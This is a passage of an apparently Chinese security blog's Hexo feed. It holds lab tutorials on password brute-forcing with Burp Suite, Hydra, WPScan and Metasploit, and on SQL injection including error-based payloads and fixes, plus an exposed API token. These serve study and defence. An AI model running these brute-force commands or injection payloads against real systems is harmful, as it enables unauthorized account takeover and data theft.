class="keyword">return</span> <span class="title function_">B</span>(n)</span><br><span class="line">                }</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">if</span> (!i) {</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_">R</span>(u, n)</span><br><span class="line">            } <span class="keyword">else</span> {</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_">M</span>(u, n)</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">        .<span class="title function_">call</span>(T, h, T, I),</span><br><span class="line">    v !== <span class="keyword">void</span> <span class="number">0</span> &amp;&amp; (I.<span class="property">exports</span> = v))</span><br><span class="line">}()</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> password = <span class="string">"1234"</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">getStr</span>(password.<span class="title function_">substr</span>(<span class="number">0</span>, <span class="number">16</span>)))</span><br><span class="line"><span class="comment">// 81dc9bdb52d04dc20036dbd8313ed055</span></span><br></pre></td></tr></tbody></table></figure>
]]></content>
      <tags>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title>找工作之旅</title>
    <url>/posts/13584/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误！！还是乖乖vivo50吧" data-whm="hash错误！！还是乖乖vivo50吧">
  <script id="hbeData" type="hbeData" data-hmacdigest="23a178af993dec960b6d6901329f744eea1ed7c08ce6a9453245ff794e653bb3"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-xray">
      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">vivo50解锁</span>
      </label>
      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">
        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>
        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>
      </svg>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <tags>
        <tag>网络安全</tag>
        <tag>journal</tag>
      </tags>
  </entry>
  <entry>
    <title>穷举</title>
    <url>/posts/e93fc31a/</url>
    <content><![CDATA[<blockquote>
<p>本文出现域名均为搭建的本地靶场域名</p>
</blockquote>
<h2 id="1-概述"><a href="#1-概述" class="headerlink" title="1 概述"></a>1 概述</h2><p>​	穷举就是枚举的意思，在互联网的今天，需要使用某种的服务，大多数都需要口令登录，这个口令就是密码，密码的强度分为，弱口令、中度口令、强度口令。如果登录的服务为弱口令，那会存在很大的安全隐患，黑客通过穷举弱口令对服务进行攻击，很容易就得到登录密码。得到密码之后就能登录服务，进行其他危害较大得操作。黑客也能通过对用户得信息整理，组合密码进行穷举攻击。例如根据用户的生日号码，出身年月日和姓名进行口令组合，再对其服务进行穷举。</p>
<p><strong>常见服务</strong></p>
<table>
<thead>
<tr>
<th>服务</th>
<th>端口</th>
</tr>
</thead>
<tbody><tr>
<td>web</td>
<td>80</td>
</tr>
<tr>
<td>mysql</td>
<td>3306</td>
</tr>
<tr>
<td>Microsoft SQL Server</td>
<td>1433</td>
</tr>
<tr>
<td>https</td>
<td>443</td>
</tr>
<tr>
<td>ftp</td>
<td>21</td>
</tr>
<tr>
<td>ssh</td>
<td>22</td>
</tr>
<tr>
<td>dns</td>
<td>53</td>
</tr>
<tr>
<td>tomcat</td>
<td>8080</td>
</tr>
<tr>
<td>redis</td>
<td>6379</td>
</tr>
<tr>
<td>rsync</td>
<td>873</td>
</tr>
<tr>
<td>PostgreSQL</td>
<td>5432</td>
</tr>
<tr>
<td>cobaltstrike teamserver</td>
<td>50050</td>
</tr>
<tr>
<td>smtp</td>
<td>25</td>
</tr>
<tr>
<td>pop3</td>
<td>110</td>
</tr>
<tr>
<td>远程终端rdp</td>
<td>3389</td>
</tr>
<tr>
<td>smb</td>
<td>445</td>
</tr>
<tr>
<td>rpc</td>
<td>135</td>
</tr>
<tr>
<td>imap</td>
<td>143</td>
</tr>
<tr>
<td>NetBIOS</td>
<td>139</td>
</tr>
<tr>
<td>SMTPS</td>
<td>465</td>
</tr>
<tr>
<td>POP3S</td>
<td>995</td>
</tr>
<tr>
<td>mogodb</td>
<td>27018</td>
</tr>
<tr>
<td>memcached</td>
<td>11211</td>
</tr>
<tr>
<td>telnet</td>
<td>23</td>
</tr>
<tr>
<td>oracle</td>
<td>1521</td>
</tr>
</tbody></table>
<h2 id="2-burpsuite穷举后台密码"><a href="#2-burpsuite穷举后台密码" class="headerlink" title="2 burpsuite穷举后台密码"></a>2 burpsuite穷举后台密码</h2><p>抓包，然后放到Intruder模块，添加payload位置</p>
<img src="/posts/e93fc31a/image-20250312225424438.png" class="" title="image-20250312225424438">

<p>加载payloads</p>
<img src="/posts/e93fc31a/image-20250312225451754.png" class="" title="image-20250312225451754">

<p>开始攻击，爆破出密码</p>
<img src="/posts/e93fc31a/image-20250312225540034.png" class="" title="image-20250312225540034">

<p>成功登录后台</p>
<img src="/posts/e93fc31a/image-20250312225644180.png" class="" title="image-20250312225644180">



<h2 id="3-带有Token防御的穷举爆破"><a href="#3-带有Token防御的穷举爆破" class="headerlink" title="3 带有Token防御的穷举爆破"></a>3 带有Token防御的穷举爆破</h2><p>有的网站存在一次性Token，再用过一次后就失效了，导致没办法爆破</p>
<img src="/posts/e93fc31a/image-20250312230827144.png" class="" title="image-20250312230827144">

<p>这里可以使用burpsuite的宏设置，打开<code>Settings</code>中的<code>Session</code>。</p>
<img src="/posts/e93fc31a/image-20250312231604753.png" class="" title="image-20250312231604753">

<p>添加规则，选择运行宏。</p>
<img src="/posts/e93fc31a/image-20250312231626743.png" class="" title="image-20250312231626743">

<p>选择添加宏</p>
<img src="/posts/e93fc31a/image-20250312231721421.png" class="" title="image-20250312231721421">

<p>这里选择包含Token的响应</p>
<img src="/posts/e93fc31a/image-20250312231837586.png" class="" title="image-20250312231837586">

<p>选择项目设置，在自定义参数位置添加，选择要获取的参数，这里要注意<strong>参数名一定要一致</strong></p>
<img src="/posts/e93fc31a/image-20250312232023480.png" class="" title="image-20250312232023480">

<p>一通确认，将更改参数名设置一下</p>
<img src="/posts/e93fc31a/image-20250312232151766.png" class="" title="image-20250312232151766">

<p>可以更改一下作用范围</p>
<img src="/posts/e93fc31a/image-20250312232336232.png" class="" title="image-20250312232336232">

<p>然后就可以开始爆破了，不过还是会有一些几率替换失败，感觉是爆破线程过高的原因，调低线程以后爆破成功了。</p>
<img src="/posts/e93fc31a/image-20250312233222030.png" class="" title="image-20250312233222030">


<h2 id="4-针对有验证码的穷举爆破"><a href="#4-针对有验证码的穷举爆破" class="headerlink" title="4 针对有验证码的穷举爆破"></a>4 针对有验证码的穷举爆破</h2><h3 id="4-1-Cookie不存在不验证绕过"><a href="#4-1-Cookie不存在不验证绕过" class="headerlink" title="4.1 Cookie不存在不验证绕过"></a>4.1 Cookie不存在不验证绕过</h3><p>在请求包Cookie中存在字段<code>PHPSESSID</code></p>
<img src="/posts/e93fc31a/image-20250312234452887.png" class="" title="image-20250312234452887">

<p>其值其实对应于一个文件</p>
<img src="/posts/e93fc31a/image-20250312234548755.png" class="" title="image-20250312234548755">

<p>这里如果对其没有验证，则可以删除<code>PHPSESSID</code>实现绕过，爆破成功</p>
<img src="/posts/e93fc31a/image-20250312234722354.png" class="" title="image-20250312234722354">

<img src="/posts/e93fc31a/image-20250312234834804.png" class="" title="image-20250312234834804">

<h3 id="4-2-后台验证码不销毁绕过"><a href="#4-2-后台验证码不销毁绕过" class="headerlink" title="4.2 后台验证码不销毁绕过"></a>4.2 后台验证码不销毁绕过</h3><p>有的网站验证码在使用后不会销毁，可以复用，达到绕过</p>
<img src="/posts/e93fc31a/image-20250312235311801.png" class="" title="image-20250312235311801">

<img src="/posts/e93fc31a/image-20250312235427207.png" class="" title="image-20250312235427207">

<h3 id="4-3-验证码识别爆破"><a href="#4-3-验证码识别爆破" class="headerlink" title="4.3 验证码识别爆破"></a>4.3 验证码识别爆破</h3><p>使用验证码识别工具，直接识别出验证码值，进行爆破</p>
<img src="/posts/e93fc31a/image-20250313000046133.png" class="" title="image-20250313000046133">

<p>这里正常抓包，添加爆破位置，添加验证码路径，载入字典即可，在载入字典时需修改<code>Line Endings</code>为<code>Windows</code>，不然字典导不进去</p>
<img src="/posts/e93fc31a/image-20250313000648523.png" class="" title="image-20250313000648523">

<img src="/posts/e93fc31a/image-20250313001039560.png" class="" title="image-20250313001039560">

<p>填写验证码错误信息，即可开始爆破</p>
<img src="/posts/e93fc31a/image-20250313001105420.png" class="" title="image-20250313001105420">



<h2 id="5-一些常见软件登录穷举"><a href="#5-一些常见软件登录穷举" class="headerlink" title="5 一些常见软件登录穷举"></a>5 一些常见软件登录穷举</h2><h3 id="5-1-phpmyadmin"><a href="#5-1-phpmyadmin" class="headerlink" title="5.1 phpmyadmin"></a>5.1 phpmyadmin</h3><p>通常爆破<code>admin</code>，<code>root</code>，<code>test</code>用户密码</p>
<img src="/posts/e93fc31a/image-20250317212314918.png" class="" title="image-20250317212314918">

<p><a href="https://bbs.kanxue.com/thread-159062.htm">下载地址</a></p>
<h3 id="5-2-WordPress"><a href="#5-2-WordPress" class="headerlink" title="5.2 WordPress"></a>5.2 WordPress</h3><p>可以拼接路径，查看账户信息<code>/wp-json/wp/v2/users</code></p>
<img src="/posts/e93fc31a/image-20250317215045138.png" class="" title="image-20250317215045138">

<p>使用<code>WPScan</code>工具，首先在<a href="https://wpscan.com/">WPScan</a>注册账户获取<code>token</code>，使用以下命令</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">$ wpscan --url http://xxx.com -e u -P ./top1000.txt --api-token 6qGDsJorRIvSazNIg9s4mwjxX8nOUPRL3to6fdJgwoo</span><br></pre></td></tr></tbody></table></figure>

<img src="/posts/e93fc31a/image-20250317215215191.png" class="" title="image-20250317215215191">

<h2 id="6-hydra工具使用"><a href="#6-hydra工具使用" class="headerlink" title="6 hydra工具使用"></a>6 hydra工具使用</h2><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">-l login 小写，指定用户名进行破解</span><br><span class="line">-L file 大写，指定用户的用户名字典</span><br><span class="line">-p pass 小写，用于指定密码破解，很少使用，一般采用密码字典。</span><br><span class="line">-P file 大写，用于指定密码字典。</span><br><span class="line">-e ns 额外的选项，n：空密码试探，s：使用指定账户和密码试探</span><br><span class="line">-M file 指定目标ip列表文件，批量破解。</span><br><span class="line">-o file 指定结果输出文件</span><br><span class="line">-f 找到第一对登录名或者密码的时候中止破解。</span><br><span class="line">-t tasks 同时运行的线程数，默认是16</span><br><span class="line">-w <span class="keyword">time</span> 设置最大超时时间，单位</span><br><span class="line">-v / -V 显示详细过程</span><br><span class="line">-R 恢复爆破（如果破解中断了，下次执行 hydra -R /path/to/hydra.restore 就可以继续任务。）</span><br><span class="line">-x 自定义密码</span><br></pre></td></tr></tbody></table></figure>



<h3 id="6-1-ssh"><a href="#6-1-ssh" class="headerlink" title="6.1 ssh"></a>6.1 ssh</h3><p><strong>配置Ubuntu root用户ssh登录</strong></p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> apt install openssh-server <span class="comment"># 安装ssh</span></span><br><span class="line">$ <span class="built_in">sudo</span> nano /etc/ssh/sshd_config</span><br><span class="line"><span class="comment"># PermitRootLogin prohibit-password ——&gt; PermitRootLogin yes</span></span><br><span class="line">$ <span class="built_in">sudo</span> service ssh restart <span class="comment"># 重启ssh服务</span></span><br></pre></td></tr></tbody></table></figure>

<p>使用<code>hydra</code>对ssh密码进行爆破</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">$ hydra -l root -P ./top500.txt -e ns -vV -t 1 -f 192.168.31.50 ssh</span><br></pre></td></tr></tbody></table></figure>

<img src="/posts/e93fc31a/image-20250317232800500.png" class="" title="image-20250317232800500">

<h3 id="6-2-ftp"><a href="#6-2-ftp" class="headerlink" title="6.2 ftp"></a>6.2 ftp</h3><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">$ hydra -l c5moon -P ./top500.txt -e ns -vV 192.168.31.51 ftp</span><br></pre></td></tr></tbody></table></figure>

<img src="/posts/e93fc31a/image-20250317233427264.png" class="" title="image-20250317233427264">

<h3 id="6-3-mysql"><a href="#6-3-mysql" class="headerlink" title="6.3 mysql"></a>6.3 mysql</h3><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">$ hydra -l root -P ./top500.txt -e ns -vV -f 192.168.31.57 mysql</span><br></pre></td></tr></tbody></table></figure>

<img src="/posts/e93fc31a/image-20250317233635882.png" class="" title="image-20250317233635882">

<h3 id="6-4-smb"><a href="#6-4-smb" class="headerlink" title="6.4 smb"></a>6.4 smb</h3><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">$ hydra -l administrator -P ./top500.txt -e ns -vV -f 192.168.31.57 smb</span><br></pre></td></tr></tbody></table></figure>

<img src="/posts/e93fc31a/image-20250317234038917.png" class="" title="image-20250317234038917">

<h3 id="6-5-rdp"><a href="#6-5-rdp" class="headerlink" title="6.5 rdp"></a>6.5 rdp</h3><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">$ hydra -l administrator -P ./top500.txt -e ns -vV -f 192.168.31.57 rdp</span><br></pre></td></tr></tbody></table></figure>

<img src="/posts/e93fc31a/image-20250317234329708.png" class="" title="image-20250317234329708">

<h3 id="6-6-http"><a href="#6-6-http" class="headerlink" title="6.6 http"></a>6.6 http</h3><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">$ hydra -l admin -P ./top500.txt -vV -f www.c1moon.com http-post-form <span class="string">"/admin/index.php:user=^USER^&amp;ps=^PASS^&amp;action=login:login-error"</span></span><br></pre></td></tr></tbody></table></figure>

<img src="/posts/e93fc31a/image-20250317235246581.png" class="" title="image-20250317235246581">

<h3 id="6-7-mssql"><a href="#6-7-mssql" class="headerlink" title="6.7 mssql"></a>6.7 mssql</h3><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">$ hydra -l sa -P ./top500.txt -e ns -vV -f 192.168.31.57 mssql</span><br></pre></td></tr></tbody></table></figure>

<img src="/posts/e93fc31a/image-20250317235614010.png" class="" title="image-20250317235614010">

<h3 id="6-8-redis"><a href="#6-8-redis" class="headerlink" title="6.8 redis"></a>6.8 redis</h3><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">$ hydra -P ./top500.txt -e ns -vV -f 192.168.31.57 redis</span><br></pre></td></tr></tbody></table></figure>

<img src="/posts/e93fc31a/image-20250317235842515.png" class="" title="image-20250317235842515">

<h2 id="7-metasploite穷举模块"><a href="#7-metasploite穷举模块" class="headerlink" title="7 metasploite穷举模块"></a>7 metasploite穷举模块</h2><h3 id="7-1-mssql爆破"><a href="#7-1-mssql爆破" class="headerlink" title="7.1 mssql爆破"></a>7.1 mssql爆破</h3><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">$ msfconsole <span class="comment"># 启动msf</span></span><br><span class="line"></span><br><span class="line">msf6 &gt; search auxiliary/scanner/mssql/mssql_login <span class="comment"># 搜索模块</span></span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   <span class="comment">#  Name                                 Disclosure Date  Rank    Check  Description</span></span><br><span class="line">   -  ----                                 ---------------  ----    -----  -----------</span><br><span class="line">   0  auxiliary/scanner/mssql/mssql_login  .                normal  No     MSSQL Login Utility</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/mssql/mssql_login</span><br><span class="line"></span><br><span class="line">msf6 &gt; use auxiliary/scanner/mssql/mssql_login <span class="comment"># 使用模块</span></span><br><span class="line">[*] New <span class="keyword">in</span> Metasploit 6.4 - The CreateSession option within this module can open an interactive session</span><br><span class="line"></span><br><span class="line">msf6 auxiliary(scanner/mssql/mssql_login) &gt; info <span class="comment"># 查看模块信息</span></span><br></pre></td></tr></tbody></table></figure>

<img src="/posts/e93fc31a/image-20250318000514529.png" class="" title="image-20250318000514529">

<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">msf6 auxiliary(scanner/mssql/mssql_login) &gt; show options <span class="comment"># 显示参数</span></span><br></pre></td></tr></tbody></table></figure>

<img src="/posts/e93fc31a/image-20250318001134113.png" class="" title="image-20250318001134113">

<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">msf6 auxiliary(scanner/mssql/mssql_login) &gt; <span class="built_in">set</span> RHOSTS 192.168.31.57</span><br><span class="line">RHOSTS =&gt; 192.168.31.57</span><br><span class="line">msf6 auxiliary(scanner/mssql/mssql_login) &gt; <span class="built_in">set</span> STOP_ON_SUCCESS <span class="literal">true</span></span><br><span class="line">STOP_ON_SUCCESS =&gt; <span class="literal">true</span></span><br><span class="line">msf6 auxiliary(scanner/mssql/mssql_login) &gt; <span class="built_in">set</span> PASS_FILE ./top500.txt</span><br><span class="line">PASS_FILE =&gt; ./top500.txt</span><br><span class="line">msf6 auxiliary(scanner/mssql/mssql_login) &gt; run</span><br><span class="line"></span><br><span class="line">[*] 192.168.31.57:1433    - 192.168.31.57:1433 - MSSQL - Starting authentication scanner.</span><br><span class="line">[!] 192.168.31.57:1433    - No active DB -- Credential data will not be saved!</span><br><span class="line">[-] 192.168.31.57:1433    - 192.168.31.57:1433 - LOGIN FAILED: WORKSTATION\sa: (Incorrect: )</span><br><span class="line">[+] 192.168.31.57:1433    - 192.168.31.57:1433 - Login Successful: WORKSTATION\sa:123456</span><br><span class="line">[*] 192.168.31.57:1433    - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] 192.168.31.57:1433    - Bruteforce completed, 1 credential was successful.</span><br><span class="line">[*] 192.168.31.57:1433    - You can open an MSSQL session with these credentials and CreateSession <span class="built_in">set</span> to <span class="literal">true</span></span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></tbody></table></figure>

<h3 id="7-2-邮箱爆破"><a href="#7-2-邮箱爆破" class="headerlink" title="7.2 邮箱爆破"></a>7.2 邮箱爆破</h3><p> 发邮件使用<code>pop3</code>协议，端口默认<code>110</code>。收邮件使用<code>smtp</code>服务，端口默认<code>25</code>。</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">msf6 auxiliary(scanner/pop3/pop3_login) &gt; <span class="built_in">set</span> RHOSTS 192.168.31.57</span><br><span class="line">RHOSTS =&gt; 192.168.31.57</span><br><span class="line">msf6 auxiliary(scanner/pop3/pop3_login) &gt; <span class="built_in">set</span> STOP_ON_SUCCESS <span class="literal">true</span></span><br><span class="line">STOP_ON_SUCCESS =&gt; <span class="literal">true</span></span><br><span class="line">msf6 auxiliary(scanner/pop3/pop3_login) &gt; <span class="built_in">set</span> USERNAME <span class="built_in">test</span>@redteam.com</span><br><span class="line">USERNAME =&gt; <span class="built_in">test</span>@redteam.com</span><br><span class="line">msf6 auxiliary(scanner/pop3/pop3_login) &gt; <span class="built_in">set</span> PASS_FILE ./top500.txt</span><br><span class="line">PASS_FILE =&gt; ./top500.txt</span><br><span class="line">msf6 auxiliary(scanner/pop3/pop3_login) &gt; exploit</span><br></pre></td></tr></tbody></table></figure>

<img src="/posts/e93fc31a/image-20250319215222421.png" class="" title="image-20250319215222421">

<h3 id="7-3-Tomcat爆破"><a href="#7-3-Tomcat爆破" class="headerlink" title="7.3 Tomcat爆破"></a>7.3 Tomcat爆破</h3><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">msf6 auxiliary(scanner/http/tomcat_mgr_login) &gt; <span class="built_in">set</span> STOP_ON_SUCCESS <span class="literal">true</span></span><br><span class="line">STOP_ON_SUCCESS =&gt; <span class="literal">true</span></span><br><span class="line">msf6 auxiliary(scanner/http/tomcat_mgr_login) &gt; <span class="built_in">set</span> RPORT 8081</span><br><span class="line">RPORT =&gt; 8081</span><br><span class="line">msf6 auxiliary(scanner/http/tomcat_mgr_login) &gt; <span class="built_in">set</span> RHOST 192.168.31.51</span><br><span class="line">RHOST =&gt; 192.168.31.51</span><br><span class="line">msf6 auxiliary(scanner/http/tomcat_mgr_login) &gt; <span class="built_in">set</span> USERNAME admin</span><br><span class="line">USERNAME =&gt; admin</span><br><span class="line">msf6 auxiliary(scanner/http/tomcat_mgr_login) &gt; <span class="built_in">set</span> PASS_FILE ./top500.txt</span><br><span class="line">PASS_FILE =&gt; ./top500.txt</span><br><span class="line">msf6 auxiliary(scanner/http/tomcat_mgr_login) &gt; <span class="built_in">set</span> USER_FILE <span class="string">""</span></span><br><span class="line">USER_FILE =&gt; </span><br><span class="line">msf6 auxiliary(scanner/http/tomcat_mgr_login) &gt; exploit</span><br></pre></td></tr></tbody></table></figure>

<img src="/posts/e93fc31a/image-20250319220322180.png" class="" title="image-20250319220322180">
]]></content>
      <tags>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title>sql注入</title>
    <url>/posts/31899/</url>
    <content><![CDATA[<h2 id="1-概述"><a href="#1-概述" class="headerlink" title="1. 概述"></a>1. 概述</h2><p><strong>漏洞描述</strong></p>
<p>​	Web程序代码中对于用户提交的参数未做过滤，被放到SQL语句中执行，导致参数中的特殊字符打破了 SQL 语句原有逻辑，黑客可以利用该漏洞执行任意 SQL 语句，如查询数据、下载数据、写入 webshell 、执行系统命令以及绕过登录限制等。</p>
<p><strong>漏洞存在条件</strong></p>
<ul>
<li>参数用户可控。</li>
<li>参数带入数据库查询。</li>
</ul>
<p><strong>测试方法</strong></p>
<p>​	在发现有可控参数的地方使用 sqlmap 进行 SQL 注入的检查或者利用，也可以使用其他的 SQL 注入工具，简单点的可以手工测试，利用单引号、and1=1 和 and 1=2 以及字符型注入进行判断。</p>
<p><strong>修复方法</strong></p>
<p>​	在代码层最佳的防御SQL注入的手段是SQL语句的<strong>预编译和绑定变量</strong>。</p>
<p>​	（1）所有的查询语句都使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到 SQL 语句中。当前几乎所有的数据库系统都提供了参数化 SQL 语句执行接口，使用此接口可以非常有效的防止SQL注入攻击。</p>
<p>​	（2）对进入数据库的特殊字符（ ‘ &lt;&gt;&amp;*; 等）进行转义处理，或编码转换。</p>
<p>​	（3）确认每种数据的类型，比如数字型的数据就必须是数字，数据库中的存储字段必须对应为 int 型。</p>
<p>​	（4）数据长度应该严格规定，能在一定程度上防止比较长的SQL 注入语句无法正确执行。 </p>
<p>​	（5）网站每个数据层的编码统一，建议全部使用 UTF-8 编码，上下层编码不一致有可能导致一些过滤模型被绕过。 </p>
<p>​	（6）严格限制网站用户的数据库的操作权限，给此用户提供仅仅能够满足其工作的权限，从而最大限度的减少注入攻击 对数据库的危害。 </p>
<p>​	（7）避免网站显示 SQL 错误信息，比如类型错误、字段不匹配等，防止攻击者利用这些错误信息进行一些判断。</p>
<h3 id="1-1-MySQL相关知识"><a href="#1-1-MySQL相关知识" class="headerlink" title="1.1 MySQL相关知识"></a>1.1 MySQL相关知识</h3><p>​	在<strong>mysql5</strong>版本以后，存在一个数据库为<code>information_schema</code>，在这个库里面，有三个重要的表：<code>columns</code>，<code>tables</code>，<code>SCHEMATA</code>表，在<code>SCHEMATA</code>表中的字段<code>SCHEMA_NAME</code>存放着数据库的信息。<code>tables</code>表中<code>TABLE_SCHEMA</code>和<code>TABLE_NAME</code>分别记录库名和表名。<code>columns</code>存储该用户创建的所有数据库的库名、表名和字段名。</p>
<h4 id="1-1-1-Navicat连接Docker容器内MySQL"><a href="#1-1-1-Navicat连接Docker容器内MySQL" class="headerlink" title="1.1.1 Navicat连接Docker容器内MySQL"></a>1.1.1 Navicat连接Docker容器内MySQL</h4><blockquote>
<p>有这个需求的原因是我太懒了，因为是用的docker开的sqli labs环境，又不想本地再配MySQL环境，因此干脆直接利用了。</p>
</blockquote>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">$ docker run -dt --name sqli-labs -p 8888:80 -p 3307:3306 -e MYSQL_ROOT_PASSWORD=root acgpiano/sqli-labs:latest</span><br></pre></td></tr></tbody></table></figure>

<p>这里需要给MySQL开一个端口映射，我这里给的是<code>3307</code>端口。</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">$ docker <span class="built_in">exec</span> -it sqli-labs /bin/bash</span><br><span class="line">$ mysql</span><br></pre></td></tr></tbody></table></figure>

<p>接下来将host修改为<code>%</code>即可。</p>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> host,<span class="keyword">user</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="keyword">user</span><span class="operator">=</span><span class="string">'root'</span>;</span><br><span class="line">FLUSH PRIVILEGES;</span><br></pre></td></tr></tbody></table></figure>

<style>.xssljgevqtod{zoom:50%;}</style><img src="/posts/31899/image-20250306000604769.png" class="xssljgevqtod" alt="image-20250306000604769">


<h3 id="1-2-判断是否存在注入"><a href="#1-2-判断是否存在注入" class="headerlink" title="1.2 判断是否存在注入"></a>1.2 判断是否存在注入</h3><figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br><span class="line">id<span class="operator">=</span><span class="string">'1'</span><span class="keyword">or</span><span class="string">'1'</span><span class="operator">=</span><span class="string">'1'</span></span><br><span class="line">id<span class="operator">=</span>"1"<span class="keyword">or</span>"1"<span class="operator">=</span>"1"</span><br></pre></td></tr></tbody></table></figure>

<p><strong>有回显</strong>：页面有数据信息返回。</p>
<p><strong>无回显</strong>：输入不同语句，页面无任何变化。</p>
<h3 id="1-3-SQL注释符"><a href="#1-3-SQL注释符" class="headerlink" title="1.3 SQL注释符"></a>1.3 SQL注释符</h3><p><code>#</code>：单行注释，常编码为%23。</p>
<p><code>--空格</code>：单行注释，注意后面有个空格。</p>
<p><code>/**/</code>：多行注释，至少存在两处的注入，也常用来作为空格绕过。</p>
<h3 id="1-4-SQL注入分类"><a href="#1-4-SQL注入分类" class="headerlink" title="1.4 SQL注入分类"></a>1.4 SQL注入分类</h3><p>按注入手法来分：<strong>联合查询、堆叠查询、布尔型、报错型、基于时间延迟</strong>。</p>
<p>按请求类型来分：<strong>GET注入、POST注入、COOKIE注入。</strong></p>
<p>按注入数据类型来分：<strong>int型、string型、like型</strong></p>
<h4 id="1-4-1-报错注入"><a href="#1-4-1-报错注入" class="headerlink" title="1.4.1 报错注入"></a>1.4.1 报错注入</h4><p><strong>XPATH报错注入</strong></p>
<p><code>updatexml（XML_document，XPath_string，new_value）</code>、<code>extractvalue（XML_document，xpath_string）</code>，XPATH的格式形如<code>/test</code>，如果XPATH出现格式错误，则会爆出XPATH语法错误。</p>
<p><strong>floor()函数报错</strong></p>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat(<span class="string">'x'</span>,<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x</span><br></pre></td></tr></tbody></table></figure>

<p><code>rand(0)</code>的重复计算是固定的，会随机生成一个[0,1]的小数，<code>rand(0)*2</code>则生成[0,2]的数，<code>floor()</code>函数是向下取整，即最后结果为0或1。我们运行一下看看。</p>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>) <span class="keyword">from</span> information_schema.tables limit <span class="number">0</span>,<span class="number">8</span>;</span><br></pre></td></tr></tbody></table></figure>

<img src="/posts/31899/image-20250306001213412.png" class="" title="image-20250306001213412">

<p>可以发现这里<code>floor(rand(0)*2)</code>的值是固定的。</p>
<p>接下来说一下<code>group by</code>的原理，<code>group by</code>在执行时，会依次取出查询表中的记录创建一个临时表，<code>group by</code>的对象就是该临时表的主键，如果临时表中出现了该主键，则该值加一，若不存在则<strong>插入</strong>。再来看这个SQL语句。</p>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat(<span class="string">'x'</span>,<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x</span><br></pre></td></tr></tbody></table></figure>

<p>其键必然为<code>x1</code>或者<code>x0</code>，那么应该只会值增加呀，为什么会报错呢？</p>
<p>这里有个重要特性：当<code>group by</code>和<code>rand()</code>同时使用时，若该临时表中没有主键，则插入前<code>rand()</code>会再执行一次。</p>
